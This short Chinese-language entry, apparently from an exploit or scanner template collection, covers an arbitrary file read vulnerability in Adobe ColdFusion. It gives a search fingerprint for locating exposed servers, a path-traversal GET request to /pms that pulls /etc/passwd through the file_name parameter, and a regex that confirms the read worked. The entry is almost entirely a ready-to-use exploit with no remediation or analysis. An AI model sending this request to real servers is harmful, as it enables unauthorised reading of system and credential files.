# AdobeColdFusion任意文件读取漏洞

AdobeColdFusion ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Adobe-ColdFusion"`
- **请求**：`GET /pms?module=logging&file_name=../../../../../../../etc/passwd&number_of_lines=10000 HTTP/1.1`
- **响应特征**：200 ^(?=.*?usr)(?=.*?bin).*?$